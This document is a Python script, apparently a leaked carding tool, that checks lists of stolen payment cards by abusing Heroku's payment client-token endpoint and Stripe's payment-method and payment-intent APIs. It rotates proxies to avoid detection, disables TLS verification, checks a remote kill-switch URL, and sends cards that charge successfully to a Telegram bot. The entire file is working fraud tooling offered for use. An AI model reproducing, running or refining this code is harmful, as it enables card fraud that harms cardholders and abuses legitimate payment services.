import os
import sys
import time
import requests
import random
import telebot

# ANSI color codes
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
RESET = "\033[0m"

# Global variables
use_proxy = False
proxies = []
bot_token = None
user_id = None

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def check_website():
    url = "https://bloodxteam.com/f.php"
    try:
        response = requests.get(url)
        if response.status_code == 200:
            content = response.text.strip()
            if content.lower() == 'yes':
                return True
            else:
                print(f"Warning: {content}")
                return False
        else:
            print(f"Failed to access the API. Status code: {response.status_code}")
            return False
    except Exception as e:
        print(f"Error accessing the API: {str(e)}")
        return False

def loading_animation():
    animation = ["\xe2\x96\x96", "\xe2\x96\x98", "\xe2\x96\x9d", "\xe2\x96\x97"]
    for _ in range(3):  # 3 seconds, 4 frames per second
        for frame in animation:
            sys.stdout.write(f"\rLoading {frame}")
            sys.stdout.flush()
            time.sleep(0.2)
    print("\nLoading complete!")

def print_ascii_art():
    ascii_art = f"""{YELLOW}
LEAKED BY PROPAGANDA
                                           
- - - - - - - - - - - - - - - - 
 Gear Name - PPG heroku - X 
 - - -ERROR! 
 - - - - - - - - - - - 
 Type - Cc checker + Autohitter                
 Developer A Gay
 Sk Health Of Heroku.com : INFINITY AND HQ 
 Channel : t.me/teampropaganda
{RESET}"""
    print(ascii_art)

def print_menu():
    print(f"{GREEN}[+] Start Card CHK Herokux [1]{RESET}")
    print(f"{GREEN}[+] Toggle Proxy [2]{RESET}")
    print(f"{GREEN}[+] Set Telegram Bot [3]{RESET}")
    print(f"\n{GREEN}Please select any option: {RESET}", end="")

def toggle_proxy():
    global use_proxy, proxies
    if not use_proxy:
        file_name = input("Enter the proxy file name: ")
        try:
            with open(file_name, 'r') as file:
                proxies = [line.strip() for line in file if line.strip()]
            use_proxy = True
            print("I will use proxy now!")
        except FileNotFoundError:
            print(f"File '{file_name}' not found in the current directory.")
    else:
        use_proxy = False
        proxies = []
        print("I will not use proxy!")
    time.sleep(2)

def set_telegram_bot():
    global bot_token, user_id
    bot_token = input("Please enter your Telegram Bot Token: ")
    user_id = input("Please enter your User ID: ")
    print("Success! I will send good cards to the bot.")
    time.sleep(2)

def send_to_telegram(message):
    if bot_token and user_id:
        bot = telebot.TeleBot(bot_token)
        try:
            bot.send_message(user_id, message)
        except Exception as e:
            print(f"Failed to send message to Telegram: {str(e)}")

import warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Suppress only the InsecureRequestWarning from urllib3
warnings.simplefilter('ignore', InsecureRequestWarning)

def parse_proxy(proxy):
    parts = proxy.split(':')
    if len(parts) == 4:
        domain, port, username, password = parts
        return {
            'http': f'http://{username}:{password}@{domain}:{port}',
            'https': f'http://{username}:{password}@{domain}:{port}'
        }
    else:
        print(f"Invalid proxy format: {proxy}")
        return None

def check_card(card_details, heroku_auth_key):
    try:
        cc, month, year, cvc = card_details.split('|')
        print(f"Processing card: {cc} with expiry {month}/{year}...")

        heroku_token_url = 'https://api.heroku.com/account/payment-method/client-token'
        heroku_headers = {
            'Authorization': f'Bearer {heroku_auth_key}',
            'User-Agent': 'Mozilla/5.0',
            'Accept': 'application/vnd.heroku+json; version=3'
        }

        heroku_token_response = requests.post(heroku_token_url, headers=heroku_headers)
        heroku_token_data = heroku_token_response.json()
        token = heroku_token_data.get('token')

        if not token:
            return f"{RED}Failed to retrieve Heroku token{RESET}"

        token_first_part = token.split('_secret_')[0]

        # Prepare data for Stripe API
        post_data = {
            'type': 'card',
            'billing_details[name]': 'Julie Herrera',
            'card[number]': cc,
            'card[cvc]': cvc,
            'card[exp_month]': month,
            'card[exp_year]': year
        }

        stripe_headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        }

        first_response = requests.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=post_data)
        first_response_data = first_response.json()
        payment_method_id = first_response_data.get('id')

        if payment_method_id:
            second_post_data = {
                'payment_method': payment_method_id,
                'key': 'pk_live_your_public_key',
                'client_secret': token
            }

            proxy_dict = None
            if use_proxy and proxies:
                proxy = random.choice(proxies)
                proxy_dict = parse_proxy(proxy)
                if proxy_dict:
                    print(f"Using proxy: {proxy}")

            second_response = requests.post(
                f'https://api.stripe.com/v1/payment_intents/{token_first_part}/confirm',
                headers=stripe_headers, data=second_post_data, proxies=proxy_dict, verify=False
            )

            response_code = second_response.status_code
            response_body = second_response.json()

            if response_code == 402:
                error_message = response_body.get('error', {}).get('message', 'Unknown error')
                return f"{RED}Error: {error_message}{RESET}"
            elif response_code == 200 and response_body.get('status') == 'succeeded':
                send_to_telegram(f"{card_details} - Charged successfully!")
                return f"{YELLOW}Charged successfully!{RESET}"
            else:
                return f"{RED}Failed with status: {response_code}{RESET}"
        else:
            return f"{RED}Failed to retrieve payment method ID{RESET}"

    except requests.exceptions.ProxyError as e:
        return f"{RED}Proxy error: {str(e)}{RESET}"
    except requests.exceptions.RequestException as e:
        return f"{RED}Request failed: {str(e)}{RESET}"
    except Exception as e:
        return f"{RED}Card check failed: {str(e)}{RESET}"

def start_card_check():
    heroku_auth_key = input("Please enter your Heroku auth token: ")
    file_name = input("Please enter your txt file name which contains cards: ")
    try:
        with open(file_name, 'r') as file:
            cards = file.readlines()

        for card in cards:
            card = card.strip()
            response = check_card(card, heroku_auth_key)
            print(f"{card} {response}")
    except FileNotFoundError:
        print(f"File '{file_name}' not found in the current directory.")

def main():
    if check_website():
        loading_animation()
        while True:
            clear_screen()
            print_ascii_art()
            print_menu()

            choice = input()

            if choice == '1':
                start_card_check()
            elif choice == '2':
                toggle_proxy()
            elif choice == '3':
                set_telegram_bot()
            else:
                print("Invalid option. Please try again.")

            input("Press Enter to continue...")
    else:
        print("Exiting the program.")
        sys.exit()

if __name__ == '__main__':
    main()
